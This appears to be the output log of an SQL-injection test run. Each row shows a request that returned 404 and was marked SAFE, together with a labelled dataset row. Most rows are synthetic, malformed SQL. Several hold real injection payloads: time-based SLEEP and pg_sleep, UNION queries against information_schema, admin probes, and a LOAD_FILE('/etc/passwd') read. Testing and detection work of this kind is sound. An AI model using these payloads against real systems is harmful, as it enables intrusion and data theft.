SQL Injection Dataset Results
Start Time: 2026-04-05 15:32:05.442580

[1] SAFE | Status:404 | Time:0.008s | Payload: sql_query,injection_type,vulnerability_status,sql_command,target_table,selected_columns,comparison_operator,logical_operator,sql_comment_syntax
[1305] SAFE | Status:404 | Time:0.01s | Payload: "SELECT created_at, updated_at FROM credentials WHERE price IN 'safe' AND price IN 'test@example.com'",None_Type,No,SELECT,credentials,"created_at, updated_at",IN,AND,
[1306] SAFE | Status:404 | Time:0.01s | Payload: DELETE MIN(created_at) FROM users WHERE product_id != 'safe' NOT product_id != 'test@example.com',None_Type,No,DELETE,users,MIN(created_at),!=,NOT,
[1307] SAFE | Status:404 | Time:0.009s | Payload: "UPDATE created_at, updated_at FROM passwords WHERE email > 'test@example.com' NOT email > 'pending'",None_Type,No,UPDATE,passwords,"created_at, updated_at",>,NOT,
[1308] SAFE | Status:404 | Time:0.011s | Payload: "INSERT id, email FROM credentials WHERE updated_at IN 'safe' NOT updated_at IN '2024-01-01'",None_Type,No,INSERT,credentials,"id, email",IN,NOT,
[1309] SAFE | Status:404 | Time:0.012s | Payload: "UPDATE created_at, updated_at FROM admin WHERE email LIKE 'active' OR email LIKE 'active'",None_Type,No,UPDATE,admin,"created_at, updated_at",LIKE,OR,
[1310] SAFE | Status:404 | Time:0.011s | Payload: "UPDATE price, status FROM credentials WHERE order_id <= '2024-01-01' AND order_id <= 1",None_Type,No,UPDATE,credentials,"price, status",<=,AND,
[1311] SAFE | Status:404 | Time:0.01s | Payload: "SELECT price, status FROM login WHERE id <= 1 LIKE ORDER BY SLEEP(5)# --",Time-Based,Yes,SELECT,login,"price, status",<=,LIKE,--
[1312] SAFE | Status:404 | Time:0.01s | Payload: "UPDATE created_at, updated_at FROM login WHERE updated_at != 'active' NOT updated_at != 'test@example.com'",None_Type,No,UPDATE,login,"created_at, updated_at",!=,NOT,
[1313] SAFE | Status:404 | Time:0.012s | Payload: "SELECT id, email FROM sessions WHERE status BETWEEN 'shipped' AND status BETWEEN 'safe'",None_Type,No,SELECT,sessions,"id, email",BETWEEN,AND,
[1314] SAFE | Status:404 | Time:0.012s | Payload: SELECT COUNT(*) FROM users WHERE id LIKE NULL OR id LIKE 'active',None_Type,No,SELECT,users,COUNT(*),LIKE,OR,
[1315] SAFE | Status:404 | Time:0.009s | Payload: CALL * FROM accounts WHERE email LIKE 'test@example.com' AND email LIKE 'pending',None_Type,No,CALL,accounts,*,LIKE,AND,
[1316] SAFE | Status:404 | Time:0.007s | Payload: "DELETE price, status FROM admin WHERE product_id IN 'shipped' NOT product_id IN 'test@example.com'",None_Type,No,DELETE,admin,"price, status",IN,NOT,
[1317] SAFE | Status:404 | Time:0.01s | Payload: CALL MIN(created_at) FROM payments WHERE email LIKE 'shipped' NOT email LIKE 1,None_Type,No,CALL,payments,MIN(created_at),LIKE,NOT,
[1318] SAFE | Status:404 | Time:0.006s | Payload: "SELECT price, status FROM passwords WHERE id != 1 OR ORDER BY SLEEP(5) #",Time-Based,Yes,SELECT,passwords,"price, status",!=,OR,#
[1319] SAFE | Status:404 | Time:0.011s | Payload: SELECT MIN(created_at) FROM passwords WHERE id > 1 OR '&&SLEEP(5)&&'1,Time-Based,Yes,SELECT,passwords,MIN(created_at),>,OR,
[1320] SAFE | Status:404 | Time:0.008s | Payload: INSERT COUNT(*) FROM credentials WHERE email LIKE 'safe' OR email LIKE 1,None_Type,No,INSERT,credentials,COUNT(*),LIKE,OR,
[1321] SAFE | Status:404 | Time:0.011s | Payload: INSERT * FROM transactions WHERE status > 'safe' AND status > '2024-01-01',None_Type,No,INSERT,transactions,*,>,AND,
[1322] SAFE | Status:404 | Time:0.013s | Payload: EXEC MIN(created_at) FROM payments WHERE updated_at > NULL NOT updated_at > NULL,None_Type,No,EXEC,payments,MIN(created_at),>,NOT,
[1323] SAFE | Status:404 | Time:0.011s | Payload: "EXEC created_at, updated_at FROM credentials WHERE id < NULL NOT id < 'test@example.com'",None_Type,No,EXEC,credentials,"created_at, updated_at",<,NOT,
[1324] SAFE | Status:404 | Time:0.011s | Payload: "EXEC id, email FROM transactions WHERE order_id != 'test@example.com' NOT order_id != 'pending'",None_Type,No,EXEC,transactions,"id, email",!=,NOT,
[1325] SAFE | Status:404 | Time:0.009s | Payload: SELECT MIN(created_at) FROM payments WHERE order_id <= 'pending' AND order_id <= 'safe',None_Type,No,SELECT,payments,MIN(created_at),<=,AND,
[1326] SAFE | Status:404 | Time:0.007s | Payload: "SELECT user_id, product_id FROM employees WHERE email IN 1 NOT email IN 'test@example.com'",None_Type,No,SELECT,employees,"user_id, product_id",IN,NOT,
[1327] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM credentials WHERE id >= 1 OR "" UNION SELECT null, table_name FROM information_schema.tables -- #",meta_based,Yes,SELECT,credentials,"created_at, updated_at",>=,OR,#
[1328] SAFE | Status:404 | Time:0.008s | Payload: "EXEC('SELECT created_at, updated_at FROM accounts WHERE id = 1 NOT ORDER BY 22--')",Error-Based,Yes,EXEC,accounts,"created_at, updated_at",=,NOT,
[1329] SAFE | Status:404 | Time:0.007s | Payload: INSERT MIN(created_at) FROM employees WHERE price > 'test@example.com' NOT price > '2024-01-01',None_Type,No,INSERT,employees,MIN(created_at),>,NOT,
[1330] SAFE | Status:404 | Time:0.006s | Payload: "SELECT id, email FROM sessions WHERE created_at > 'active' AND created_at > 'safe'",None_Type,No,SELECT,sessions,"id, email",>,AND,
[1331] SAFE | Status:404 | Time:0.007s | Payload: "DELETE id, email FROM admin WHERE email LIKE 1 AND email LIKE 'shipped'",None_Type,No,DELETE,admin,"id, email",LIKE,AND,
[1332] SAFE | Status:404 | Time:0.005s | Payload: "CALL id, email FROM employees WHERE user_id = 'active' NOT user_id = 'safe'",None_Type,No,CALL,employees,"id, email",=,NOT,
[1333] SAFE | Status:404 | Time:0.008s | Payload: "EXEC('SELECT MIN(created_at) FROM passwords WHERE id = 1 OR "" UNION SELECT null, null, null, null FROM information_schema.tables --') --",meta_based,Yes,EXEC,passwords,MIN(created_at),=,OR,--
[1334] SAFE | Status:404 | Time:0.013s | Payload: "SELECT id, email FROM users WHERE id <= 1 NOT "" OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 -- #",meta_based,Yes,SELECT,users,"id, email",<=,NOT,#
[1335] SAFE | Status:404 | Time:0.012s | Payload: DELETE FROM sessions WHERE id >= 1 OR ORDER BY 30#,Error-Based,Yes,DELETE,sessions,*,>=,OR,
[1336] SAFE | Status:404 | Time:0.009s | Payload: SELECT * FROM accounts WHERE price < 'active' NOT price < 'test@example.com',None_Type,No,SELECT,accounts,*,<,NOT,
[1337] SAFE | Status:404 | Time:0.009s | Payload: "UPDATE created_at, updated_at FROM transactions WHERE created_at > 1 NOT created_at > NULL",None_Type,No,UPDATE,transactions,"created_at, updated_at",>,NOT,
[1338] SAFE | Status:404 | Time:0.009s | Payload: INSERT MIN(created_at) FROM accounts WHERE created_at > 'safe' OR created_at > 'pending',None_Type,No,INSERT,accounts,MIN(created_at),>,OR,
[1339] SAFE | Status:404 | Time:0.006s | Payload: EXEC MAX(price) FROM transactions WHERE price != 'active' NOT price != '2024-01-01',None_Type,No,EXEC,transactions,MAX(price),!=,NOT,
[1340] SAFE | Status:404 | Time:0.007s | Payload: SELECT MAX(price) FROM employees WHERE id >= 1 %' AND 8310=8311 AND '%'=' --,Error-Based,Yes,SELECT,employees,MAX(price),>=,,--
[1341] SAFE | Status:404 | Time:0.005s | Payload: UPDATE * FROM admin WHERE status != 'active' OR status != 1,None_Type,No,UPDATE,admin,*,!=,OR,
[1342] SAFE | Status:404 | Time:0.006s | Payload: "CALL price, status FROM login WHERE user_id <= NULL NOT user_id <= 'shipped'",None_Type,No,CALL,login,"price, status",<=,NOT,
[1343] SAFE | Status:404 | Time:0.005s | Payload: UPDATE MAX(price) FROM passwords WHERE id > 'shipped' NOT id > 'pending',None_Type,No,UPDATE,passwords,MAX(price),>,NOT,
[1344] SAFE | Status:404 | Time:0.005s | Payload: EXEC COUNT(*) FROM login WHERE created_at != 'active' OR created_at != 1,None_Type,No,EXEC,login,COUNT(*),!=,OR,
[1345] SAFE | Status:404 | Time:0.005s | Payload: UPDATE MIN(created_at) FROM sessions WHERE id IN 'safe' OR id IN 'active',None_Type,No,UPDATE,sessions,MIN(created_at),IN,OR,
[1346] SAFE | Status:404 | Time:0.004s | Payload: "DELETE price, status FROM admin WHERE id LIKE 'active' OR id LIKE 'pending'",None_Type,No,DELETE,admin,"price, status",LIKE,OR,
[1347] SAFE | Status:404 | Time:0.013s | Payload: "DELETE user_id, product_id FROM users WHERE price BETWEEN 'test@example.com' NOT price BETWEEN '2024-01-01'",None_Type,No,DELETE,users,"user_id, product_id",BETWEEN,NOT,
[1348] SAFE | Status:404 | Time:0.006s | Payload: DELETE * FROM sessions WHERE price = 'shipped' AND price = 'safe',None_Type,No,DELETE,sessions,*,=,AND,
[1349] SAFE | Status:404 | Time:0.008s | Payload: "DELETE created_at, updated_at FROM transactions WHERE email LIKE NULL NOT email LIKE 'safe'",None_Type,No,DELETE,transactions,"created_at, updated_at",LIKE,NOT,
[1350] SAFE | Status:404 | Time:0.005s | Payload: EXEC MAX(price) FROM passwords WHERE price != '2024-01-01' AND price != 'active',None_Type,No,EXEC,passwords,MAX(price),!=,AND,
[1351] SAFE | Status:404 | Time:0.006s | Payload: INSERT MAX(price) FROM sessions WHERE product_id > '2024-01-01' NOT product_id > 'active',None_Type,No,INSERT,sessions,MAX(price),>,NOT,
[1352] SAFE | Status:404 | Time:0.005s | Payload: "UPDATE id, email FROM credentials WHERE product_id <= 'test@example.com' AND product_id <= '2024-01-01'",None_Type,No,UPDATE,credentials,"id, email",<=,AND,
[1353] SAFE | Status:404 | Time:0.004s | Payload: "DELETE user_id, product_id FROM passwords WHERE status != 'safe' AND status != 'active'",None_Type,No,DELETE,passwords,"user_id, product_id",!=,AND,
[1354] SAFE | Status:404 | Time:0.005s | Payload: INSERT MAX(price) FROM sessions WHERE updated_at >= 'pending' NOT updated_at >= 'active',None_Type,No,INSERT,sessions,MAX(price),>=,NOT,
[1355] SAFE | Status:404 | Time:0.005s | Payload: CALL MAX(price) FROM passwords WHERE updated_at < 'pending' OR updated_at < NULL,None_Type,No,CALL,passwords,MAX(price),<,OR,
[1356] SAFE | Status:404 | Time:0.004s | Payload: EXEC MAX(price) FROM credentials WHERE updated_at <= 'pending' NOT updated_at <= 'test@example.com',None_Type,No,EXEC,credentials,MAX(price),<=,NOT,
[1357] SAFE | Status:404 | Time:0.005s | Payload: INSERT MAX(price) FROM passwords WHERE price < 'shipped' AND price < NULL,None_Type,No,INSERT,passwords,MAX(price),<,AND,
[1358] SAFE | Status:404 | Time:0.005s | Payload: CALL MAX(price) FROM transactions WHERE updated_at BETWEEN '2024-01-01' AND updated_at BETWEEN '2024-01-01',None_Type,No,CALL,transactions,MAX(price),BETWEEN,AND,
[1359] SAFE | Status:404 | Time:0.004s | Payload: INSERT * FROM login WHERE product_id BETWEEN 'pending' AND product_id BETWEEN 'test@example.com',None_Type,No,INSERT,login,*,BETWEEN,AND,
[1360] SAFE | Status:404 | Time:0.005s | Payload: SELECT MIN(created_at) FROM sessions WHERE created_at != NULL OR created_at != '2024-01-01',None_Type,No,SELECT,sessions,MIN(created_at),!=,OR,
[1361] SAFE | Status:404 | Time:0.006s | Payload: SELECT MAX(price) FROM login WHERE id = 1 OR 1=1 AND (SELECT 1 FROM DUAL WHERE LENGTH((SELECT version()))>0)-- #,stackqueries_based,Yes,SELECT,login,MAX(price),=,Embedded in Payload,#
[1362] SAFE | Status:404 | Time:0.007s | Payload: "EXEC created_at, updated_at FROM accounts WHERE updated_at < 'shipped' OR updated_at < 'shipped'",None_Type,No,EXEC,accounts,"created_at, updated_at",<,OR,
[1363] SAFE | Status:404 | Time:0.01s | Payload: SELECT COUNT(*) FROM payments WHERE id <= 1 AND id <= 1,None_Type,No,SELECT,payments,COUNT(*),<=,AND,
[1364] SAFE | Status:404 | Time:0.009s | Payload: "CALL created_at, updated_at FROM sessions WHERE id IN NULL OR id IN '2024-01-01'",None_Type,No,CALL,sessions,"created_at, updated_at",IN,OR,
[1365] SAFE | Status:404 | Time:0.01s | Payload: SELECT COUNT(*) FROM passwords WHERE id >= 1 OR 1=1 AND EXISTS(SELECT * FROM users WHERE username='admin')-- #,stackqueries_based,Yes,SELECT,passwords,COUNT(*),>=,Embedded in Payload,#
[1366] SAFE | Status:404 | Time:0.007s | Payload: DELETE COUNT(*) FROM credentials WHERE id = 'active' AND id = 1,None_Type,No,DELETE,credentials,COUNT(*),=,AND,
[1367] SAFE | Status:404 | Time:0.009s | Payload: "SELECT price, status FROM payments WHERE id != 1 ')) or pg_sleep(5)--",Time-Based,Yes,SELECT,payments,"price, status",!=,,
[1368] SAFE | Status:404 | Time:0.008s | Payload: DELETE MAX(price) FROM credentials WHERE created_at <= 1 AND created_at <= 'active',None_Type,No,DELETE,credentials,MAX(price),<=,AND,
[1369] SAFE | Status:404 | Time:0.006s | Payload: DELETE COUNT(*) FROM sessions WHERE created_at IN 'pending' NOT created_at IN 1,None_Type,No,DELETE,sessions,COUNT(*),IN,NOT,
[1370] SAFE | Status:404 | Time:0.008s | Payload: "UPDATE employees SET name = 'admin' AND benchmark(50000000,MD5(1))-- WHERE id >= 1 #",Time-Based,Yes,UPDATE,employees,*,>=,AND,#
[1371] SAFE | Status:404 | Time:0.009s | Payload: SELECT COUNT(*) FROM passwords WHERE user_id > 'shipped' AND user_id > 1,None_Type,No,SELECT,passwords,COUNT(*),>,AND,
[1372] SAFE | Status:404 | Time:0.009s | Payload: "SELECT price, status FROM transactions WHERE id != 1 LIKE AND (SELECT COUNT(*) FROM users WHERE username='admin') = 1 -- #",meta_based,Yes,SELECT,transactions,"price, status",!=,LIKE,#
[1373] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM payments WHERE email LIKE 'test@example.com' OR email LIKE 1",None_Type,No,SELECT,payments,"created_at, updated_at",LIKE,OR,
[1374] SAFE | Status:404 | Time:0.008s | Payload: "EXEC('SELECT price, status FROM accounts WHERE id < 1 OR 1=1 UNION SELECT LOAD_FILE('/etc/passwd'), null, null, null--') #",stackqueries_based,Yes,EXEC,accounts,"price, status",<,Embedded in Payload,#
[1375] SAFE | Status:404 | Time:0.007s | Payload: "EXEC id, email FROM sessions WHERE status BETWEEN NULL OR status BETWEEN 'safe'",None_Type,No,EXEC,sessions,"id, email",BETWEEN,OR,
[1376] SAFE | Status:404 | Time:0.007s | Payload: INSERT COUNT(*) FROM users WHERE email < 'safe' AND email < '2024-01-01',None_Type,No,INSERT,users,COUNT(*),<,AND,
[1377] SAFE | Status:404 | Time:0.005s | Payload: DELETE * FROM transactions WHERE email > 'pending' OR email > NULL,None_Type,No,DELETE,transactions,*,>,OR,
[1378] SAFE | Status:404 | Time:0.004s | Payload: "INSERT price, status FROM payments WHERE order_id IN 'test@example.com' OR order_id IN 'safe'",None_Type,No,INSERT,payments,"price, status",IN,OR,
[1379] SAFE | Status:404 | Time:0.008s | Payload: SELECT COUNT(*) FROM payments WHERE user_id != 'pending' NOT user_id != 'shipped',None_Type,No,SELECT,payments,COUNT(*),!=,NOT,
[1380] SAFE | Status:404 | Time:0.006s | Payload: UPDATE * FROM users WHERE created_at = 1 OR created_at = '2024-01-01',None_Type,No,UPDATE,users,*,=,OR,
[1381] SAFE | Status:404 | Time:0.009s | Payload: CALL MAX(price) FROM sessions WHERE status >= 1 NOT status >= 'test@example.com',None_Type,No,CALL,sessions,MAX(price),>=,NOT,
[1382] SAFE | Status:404 | Time:0.007s | Payload: DELETE MIN(created_at) FROM login WHERE created_at <= 'active' OR created_at <= 'active',None_Type,No,DELETE,login,MIN(created_at),<=,OR,
[1383] SAFE | Status:404 | Time:0.008s | Payload: INSERT MAX(price) FROM employees WHERE updated_at > NULL OR updated_at > NULL,None_Type,No,INSERT,employees,MAX(price),>,OR,
[1384] SAFE | Status:404 | Time:0.007s | Payload: "SELECT id, email FROM employees WHERE id = 1 NOT OR (SELECT COUNT(*) FROM users WHERE username='admin') > 0 -- #",meta_based,Yes,SELECT,employees,"id, email",=,NOT,#
[1385] SAFE | Status:404 | Time:0.009s | Payload: "CALL created_at, updated_at FROM employees WHERE user_id < '2024-01-01' OR user_id < 'safe'",None_Type,No,CALL,employees,"created_at, updated_at",<,OR,
[1386] SAFE | Status:404 | Time:0.006s | Payload: INSERT COUNT(*) FROM passwords WHERE price IN 'shipped' AND price IN 'active',None_Type,No,INSERT,passwords,COUNT(*),IN,AND,
[1387] SAFE | Status:404 | Time:0.007s | Payload: "CALL user_id, product_id FROM sessions WHERE id = 'active' OR id = 'safe'",None_Type,No,CALL,sessions,"user_id, product_id",=,OR,
[1388] SAFE | Status:404 | Time:0.005s | Payload: EXEC COUNT(*) FROM payments WHERE product_id <= 'safe' NOT product_id <= 1,None_Type,No,EXEC,payments,COUNT(*),<=,NOT,
[1389] SAFE | Status:404 | Time:0.006s | Payload: "DELETE price, status FROM sessions WHERE price >= 'pending' AND price >= NULL",None_Type,No,DELETE,sessions,"price, status",>=,AND,
[1390] SAFE | Status:404 | Time:0.008s | Payload: "INSERT created_at, updated_at FROM passwords WHERE status = 'shipped' NOT status = '2024-01-01'",None_Type,No,INSERT,passwords,"created_at, updated_at",=,NOT,
[1391] SAFE | Status:404 | Time:0.006s | Payload: DELETE MAX(price) FROM admin WHERE id IN 'active' NOT id IN 'shipped',None_Type,No,DELETE,admin,MAX(price),IN,NOT,
[1392] SAFE | Status:404 | Time:0.009s | Payload: INSERT * FROM employees WHERE price BETWEEN 'pending' OR price BETWEEN 1,None_Type,No,INSERT,employees,*,BETWEEN,OR,
[1393] SAFE | Status:404 | Time:0.007s | Payload: "DELETE id, email FROM transactions WHERE user_id < 'safe' OR user_id < 'pending'",None_Type,No,DELETE,transactions,"id, email",<,OR,
[1394] SAFE | Status:404 | Time:0.007s | Payload: SELECT * FROM users WHERE id >= 1 AND ORDER BY 3 --,Union-Based,Yes,SELECT,users,*,>=,AND,--
[1395] SAFE | Status:404 | Time:0.006s | Payload: SELECT * FROM transactions WHERE id < 1 LIKE RANDOMBLOB(1000000000/2),Time-Based,Yes,SELECT,transactions,*,<,LIKE,
[1396] SAFE | Status:404 | Time:0.006s | Payload: DELETE * FROM credentials WHERE price IN 'test@example.com' OR price IN 1,None_Type,No,DELETE,credentials,*,IN,OR,
[1397] SAFE | Status:404 | Time:0.008s | Payload: "CALL price, status FROM payments WHERE product_id <= 'safe' AND product_id <= 'pending'",None_Type,No,CALL,payments,"price, status",<=,AND,
[1398] SAFE | Status:404 | Time:0.006s | Payload: CALL MAX(price) FROM employees WHERE price BETWEEN NULL OR price BETWEEN 'test@example.com',None_Type,No,CALL,employees,MAX(price),BETWEEN,OR,
[1399] SAFE | Status:404 | Time:0.009s | Payload: SELECT COUNT(*) FROM employees WHERE id = 1 NOT HAVING 1=1 #,Error-Based,Yes,SELECT,employees,COUNT(*),=,NOT,#
[1400] SAFE | Status:404 | Time:0.007s | Payload: "SELECT price, status FROM payments WHERE order_id > 'pending' NOT order_id > 'test@example.com'",None_Type,No,SELECT,payments,"price, status",>,NOT,
[1401] SAFE | Status:404 | Time:0.006s | Payload: EXEC * FROM passwords WHERE product_id BETWEEN '2024-01-01' NOT product_id BETWEEN '2024-01-01',None_Type,No,EXEC,passwords,*,BETWEEN,NOT,
[1402] SAFE | Status:404 | Time:0.005s | Payload: "SELECT user_id, product_id FROM payments WHERE product_id IN 'pending' OR product_id IN NULL",None_Type,No,SELECT,payments,"user_id, product_id",IN,OR,
[1403] SAFE | Status:404 | Time:0.008s | Payload: "EXEC price, status FROM users WHERE status != 'pending' NOT status != NULL",None_Type,No,EXEC,users,"price, status",!=,NOT,
[1404] SAFE | Status:404 | Time:0.007s | Payload: DELETE FROM passwords WHERE id < 1 (SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- --,Time-Based,Yes,DELETE,passwords,*,<,,--
[1405] SAFE | Status:404 | Time:0.007s | Payload: UPDATE credentials SET name = 'admin' WHERE id < 1 AND 1=0# --,Error-Based,Yes,UPDATE,credentials,*,<,,--
[1406] SAFE | Status:404 | Time:0.006s | Payload: INSERT MIN(created_at) FROM passwords WHERE product_id LIKE NULL NOT product_id LIKE 'safe',None_Type,No,INSERT,passwords,MIN(created_at),LIKE,NOT,
[1407] SAFE | Status:404 | Time:0.005s | Payload: "DELETE user_id, product_id FROM login WHERE status >= 'active' NOT status >= 'safe'",None_Type,No,DELETE,login,"user_id, product_id",>=,NOT,
[1408] SAFE | Status:404 | Time:0.009s | Payload: "DELETE id, email FROM accounts WHERE created_at LIKE 'test@example.com' AND created_at LIKE 'pending'",None_Type,No,DELETE,accounts,"id, email",LIKE,AND,
